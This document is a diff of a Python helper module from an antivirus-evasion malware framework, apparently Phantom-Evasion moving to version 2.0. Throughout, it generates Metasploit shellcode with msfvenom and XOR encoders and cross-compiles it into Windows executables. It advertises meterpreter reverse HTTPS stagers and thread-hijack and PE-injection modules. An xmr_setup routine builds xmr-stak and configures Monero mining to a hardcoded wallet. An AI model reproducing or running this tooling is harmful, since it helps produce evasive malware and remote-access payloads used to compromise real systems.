@@ -87,124 +87,22 @@ def InputFunc(Text):
 
         Ans = raw_input(Text)
 
-    return Ans    
-
-def linux_isready():
-    
-    try:
-        is_present=subprocess.check_output(['which','apt'],stderr=subprocess.STDOUT)
-
-    except subprocess.CalledProcessError: 
-        print(bcolors.RED + "[-] APT  [Not Found]\n")
-        print("[-] Only dependencies check ( auto install not supported )\n")
-        print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
-        auto_check("apktool")
-        Apktool_download()
-        auto_check("gcc")
-        auto_check("mingw-w64")
-        auto_check("pyinstaller")
-        auto_check("apksigner")
-        auto_check("msfvenom")
-        auto_check("msfconsole")
-        auto_check("openssl")
-        auto_check("strip")
-        auto_check("wine")
-        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
-        sleep(1)
-    else:
-        print(bcolors.GREEN + "[>] APT [Found]" + bcolors.ENDC) 
-        sleep(0.1)
-        ubuntu_isready()
-    
+    return Ans
 
 
-def kali_arch_isready():
-    sleep(0.5)
-    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
-    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
-
-    if package == 0:
-        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
-    else:
-        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
-        sleep(1)
-        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
-        sleep(1)
-        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
-    sleep(0.5)
-    auto_setup("apktool")
-    Apktool_download()
-    auto_setup("gcc")
-    auto_setup("mingw-w64")
-    auto_setup("pyinstaller")
-    auto_setup("apksigner")
-    auto_setup("msfvenom")
-    auto_setup("msfconsole")
-    auto_setup("openssl")
-    auto_setup("strip")
-    auto_setup("wine")    
-    if wine_fastcheck() == True:
-        sleep(0.2)
-        print(bcolors.GREEN + "\n[>] Wine Environment Ready\n" + bcolors.ENDC)
-        sleep(0.5)
-    else:       
-        wine_check()
-    miner_advisor()
-    print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
-    sleep(1)
-
-def ubuntu_isready():
-    sleep(0.5)
-
-    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
-    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
-
-    if package == 0:
-        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
-    else:
-        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
-        sleep(1)
-        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
-        sleep(1)
-        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
-    auto_setup("apktool")
-    Apktool_download()
-    auto_setup("gcc")
-    auto_setup("mingw-w64")
-    auto_setup("pyinstaller")
-    auto_setup("apksigner")
-    auto_setup("openssl")
-    auto_setup("strip")
-    auto_setup("wine")
-    if wine_fastcheck() == True:
-        sleep(0.2)
-        print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
-        sleep(0.5)
-    else:       
-        wine_check()
-
-    miner_advisor()
-
-    try:
-        is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
-
-    except subprocess.CalledProcessError: 
-        print(bcolors.RED + "[-] Metasploit-Framework  [Not Found]\n")
-        print("[-] you need to install metasploit framework manually\n")
-
-
-    else:
-        print(bcolors.GREEN + "[>] Metasploit-Framework  [Found]" + bcolors.ENDC) 
-        sleep(0.1)    
-        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
-        sleep(1)
 
 def auto_setup(name):
     name2=name
-    numspace = " " * (35 - len(name))
+
     if "mingw-w64" in name:
 
         name2="i686-w64-mingw32-gcc"
+
+    elif ("metasploit-framework" in name):
+
+        name2="msfvenom"
+
+    numspace = " " * (35 - len(name))
 
     try:
         is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)
@@ -227,6 +125,10 @@ def auto_check(name):
 
         name2="i686-w64-mingw32-gcc"
 
+    elif ("metasploit-framework" in name):
+
+        name2="msfvenom"
+
     try:
         is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)
 
@@ -236,11 +138,115 @@ def auto_check(name):
         sleep(1)
     else:
         print(bcolors.GREEN + "[+] " + name + numspace + "  [Found]\n" + bcolors.ENDC) 
+        sleep(0.1) 
+
+def linux_isready():
+    
+    try:
+        is_present=subprocess.check_output(['which','apt'],stderr=subprocess.STDOUT)
+
+    except subprocess.CalledProcessError: 
+        print(bcolors.RED + "[-] APT  [Not Found]\n")
+        print("[-] Only dependencies check ( auto install not supported )\n")
+        print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
+        auto_check("apktool")
+        Apktool_download()
+        auto_check("gcc")
+        auto_check("mingw-w64")
+        auto_check("pyinstaller")
+        auto_check("apksigner")
+        auto_check("metasploit-framework")
+        auto_check("strip")
+        auto_check("wine")
+
+        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
+        sleep(1)
+
+    else:
+        print(bcolors.GREEN + "[>] APT [Found]" + bcolors.ENDC) 
         sleep(0.1)
+        ubuntu_isready()
+
+def kali_parrot_isready():
+    sleep(0.5)
+    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
+    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
+
+    if package == 0:
+        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
+    else:
+        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
+        sleep(1)
+        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
+        sleep(1)
+        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
+
+    sleep(0.5)
+    auto_setup("apktool")
+    Apktool_download()
+    auto_setup("gcc")
+    auto_setup("mingw-w64")
+    auto_setup("pyinstaller")
+    auto_setup("apksigner")
+    auto_setup("metasploit-framework")
+    auto_setup("strip")
+    
+    if wine_fastcheck() == True:
+        sleep(0.2)
+        print(bcolors.GREEN + "\n[>] Wine Environment Ready\n" + bcolors.ENDC)
+        sleep(0.5)
+    else:       
+        wine_check()
+
+    miner_advisor()
+    print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
+    sleep(1)
+
+def ubuntu_isready():
+    sleep(0.5)
+
+    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
+    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
+
+    if package == 0:
+        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
+    else:
+        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
+        sleep(1)
+        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
+        sleep(1)
+        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
+
+    auto_setup("apktool")
+    Apktool_download()
+    auto_setup("gcc")
+    auto_setup("mingw-w64")
+    auto_setup("pyinstaller")
+    auto_setup("apksigner")
+    auto_setup("openssl")
+    auto_setup("strip")
+
+    miner_advisor()
+
+    try:
+        is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
+
+    except subprocess.CalledProcessError: 
+        print(bcolors.RED + "[-] Metasploit-Framework  [Not Found]\n")
+        print("[-] you need to install metasploit framework manually\n")
+
+
+    else:
+        print(bcolors.GREEN + "[>] Metasploit-Framework  [Found]" + bcolors.ENDC) 
+        sleep(0.1)    
+        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
+        sleep(1)
+
 
 
 
 def Apktool_download():
+
     numspace = " " * (35 - len("apktool.jar file"))
     if os.path.isfile("Setup/apk_sign/apktool_2.3.3.jar") != True:
 
@@ -282,7 +288,15 @@ def dependencies_checker():
                 print(bcolors.OCRA + bcolors.BOLD + "\n[>] Kali 2 Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
                 sleep(1)
 
-            kali_arch_isready()
+            kali_parrot_isready()
+
+        elif "parrot" in release_used:
+
+            print(bcolors.OCRA + bcolors.BOLD + "\n[>] Parrot Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
+            sleep(1)
+
+            kali_parrot_isready()
+
 
         elif "Ubuntu" in release_used:                
                 
@@ -299,7 +313,7 @@ def dependencies_checker():
 
         print(bcolors.RED + bcolors.BOLD + "\n[>] Windows Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
         sleep(1)
-        print("[-] Auto install not supported\n")
+        print("[-] Auto setup not supported\n")
         sleep(0.2)
         print("[-] Check README to properly install the dependencies\n")
         sleep(1)
@@ -317,19 +331,42 @@ def strip_tease(Filename):
 
 
     if RequireStrip == "True":
+
         sleep(0.5)
         print(bcolors.GREEN + "\n[>] Stripping...\n"  + bcolors.ENDC)
         sleep(1)
         subprocess.call(['strip',Filename])
 
 def wine_fastcheck():
+
     wine=False
     wineok = open("Setup/Config.txt","r")
     for line in wineok:
         if "WinEnv=OK" in line:
             wine=True
     return wine
-   
+
+def wine_python():
+    i386_arch=os.system("dpkg --print-foreign-architectures | grep '^i386$' >/dev/null 2>&1")
+
+    if i386_arch != "i386":
+        print("[>] Add x86 architecture...\n")
+        os.system("dpkg --add-architecture i386 >/dev/null 2>&1")
+        os.system("apt-get update -y")
+
+    print("[>] Trying to install wine...\n")
+    os.system("apt-get install wine wine64 wine32 -y")
+    print("[>] Wine configuration..\n")
+    os.system("wineboot -u")
+    print("[>] Download python3.4 for wine..\n")
+    os.system("wget https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi || curl -O https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi")
+    os.system("wine msiexec /i python-3.4.4.msi")
+    sleep(1)
+    os.system("rm -fr python-3.4.4.msi")
+
+def wine_pyinstaller():
+    print("[>] Download pyinstaller for wine..\n")
+    os.system("wine pip3 install pyinstaller")   
 
 def wine_check():
     FLAG1=""
@@ -338,18 +375,19 @@ def wine_check():
     try:
         py_check=subprocess.check_output(['wine','python','-v'],stderr=subprocess.STDOUT)
 
-    except subprocess.CalledProcessError: 
+    except subprocess.CalledProcessError:
+
         print(bcolors.RED + bcolors.BOLD + "\n[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-        print("In order to use windows wine-pyinstaller modules you need to\n install python on wine manually (\"wine python --version\" to check if it's reachable from commandline)\n")
-        Enter2Continue() 
+        wine_python()
+#        print("In order to use windows wine-pyinstaller modules you need to\n install python on wine manually (\"wine python --version\" to check if it's reachable from commandline)\n")
         
         
     else:
 
         if "cannot find" in py_check:
             print(bcolors.RED + bcolors.BOLD + "\n[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-            print("In order to use windows wine-pyinstaller modules you need to\n manually install python on wine manually (\"wine python --version\" to check if python is reachable from commandline)\n")
-            Enter2Continue()
+#            print("In order to use windows wine-pyinstaller modules you need to\n manually install python on wine manually (\"wine python --version\" to check if python is reachable from commandline)\n")
+            wine_python()
         else:
 
             print(bcolors.GREEN + "[Wine] Python Found" + bcolors.ENDC)
@@ -362,15 +400,15 @@ def wine_check():
     except subprocess.CalledProcessError:
 
         print(bcolors.RED + bcolors.BOLD + "\n[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-        print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
-        Enter2Continue() 
+#        print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
+        wine_pyinstaller() 
         
 
     else:
         if "cannot find" in pyin_check:
             print(bcolors.RED + bcolors.BOLD + "\n[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-            print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
-            Enter2Continue() 
+#            print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
+            wine_pyinstaller()
 
         else:
 
@@ -439,7 +477,7 @@ def miner_advisor():
 
 def xmr_setup():
 
-    os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
+    os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
 
     username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))
 
@@ -486,9 +524,9 @@ def xmr_setup():
     pool_config = ""
     pool_config += "\"pool_list\" :\n"
     pool_config += "[\n"
-    pool_config += "	{\"pool_address\" : \"gulf.moneroocean.stream:10001\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\",\"rig_id\" : \"\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
+    pool_config += "	{\"pool_address\" : \"gulf.moneroocean.stream:80\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\",\"rig_id\" : \"\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
     pool_config += "],\n"
-    pool_config += "\"currency\" : \"monero7\",\n"
+    pool_config += "\"currency\" : \"monero\",\n"
 
     with open("Setup/Donate/xmr-stak/build/bin/pools.txt", "w") as poolconfig:
         poolconfig.write(pool_config)
@@ -503,33 +541,33 @@ def xmr_setup():
 
     if Thread_num == 2:
 
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
 
     elif Thread_num == 4:
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
 
     elif Thread_num == 6:
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 1 },\n"
 
     elif Thread_num == 8:
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 1 },\n"
 
     elif Thread_num == 12:
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 1 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 2 },\n"
 
     elif Thread_num >= 16:
 
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"    
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 3 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 1 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 2 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 3 },\n"
 
     else:
-        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"asm\" : \"auto\", \"affine_to_cpu\" : 0 },\n"
 
     cpu_config += "\n],\n"
 
@@ -546,11 +584,11 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "1.2 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "2.0 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "24\n")
+    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "51\n")
     sleep(0.2)
-    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Pure C meterpreter stager,Persistence modules \n")
+    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "C meterpreter reverse https stager, Thread hijack & PE inject modules  \n")
   
 
     sleep(3)
@@ -570,7 +608,7 @@ def banner():
     bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
     bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
     bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
-    bann += "                                                        v1.2      \n"
+    bann += "                                                        v2.0      \n"
     sleep(0.3)
     print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
   
@@ -813,7 +851,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -822,7 +860,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x64":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -833,11 +871,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     if arch == "x64":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
             if payload_format == "psh":
 
@@ -867,7 +905,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x86":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
 
@@ -875,7 +913,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -885,11 +923,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
 
                     if arch == "x64":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
 
 
 
@@ -926,7 +964,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x86":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
 
@@ -934,7 +972,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -944,11 +982,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     if arch == "x64":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
 
 
@@ -978,7 +1016,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']                        
 
@@ -986,7 +1024,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -996,11 +1034,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x86/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
                     if arch == "x64":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-e','x64/xor_dynamic','-i','1','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
             if payload_format == "psh":
 
@@ -1021,39 +1059,50 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
     return str(Payload)
 
         
-def custom_payload_completer(custom_shellcode):
+def custom_payload_completer(custom_shellcode): 
 
     Payload = "unsigned char buf[] = \"" + custom_shellcode + "\";\n"
 
     return Payload
 
 
-def auto_compiler(module_type,arch,filename,ws2 = False):
+def auto_compiler(module_type,arch,filename,link = ""):
     Os_used = platform.system()
     if Os_used == "Linux":
 
         if "windows" in module_type and arch == "x86":
-            filename += ".exe"
 
-            if ws2 != True: 
+            filename += ".exe"     
 
-                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 
+            if link == "": 
 
-            else:
+                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])
+
+            elif link == "wininet":
+
+                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lwininet'])
+
+            elif link == "winsock":
 
                 subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32']) 
+
 
         elif "windows" in module_type and arch == "x64": 
 
             filename += ".exe"
 
-            if ws2 != True:
+            if link == "":
 
                 subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])
 
-            else:
+            elif link == "wininet":
+
+                subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lwininet'])
+
+            elif link == "winsock":
 
                 subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32'])
+
 
         elif "linux" in module_type and arch == "x86":
 
@@ -1068,20 +1117,34 @@ def auto_compiler(module_type,arch,filename,ws2 = False):
     elif Os_used == "Windows":
 
         if "windows" in module_type and arch == "x86":
+
             filename += ".exe"
-            if ws2 != True:
+
+            if link == "":
 
                 subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie'],shell=True)
+            
+            elif link == "wininet":
 
-            else:
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie','-lwininet'],shell=True)
+
+            elif link == "winsock":
 
                 subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)
 
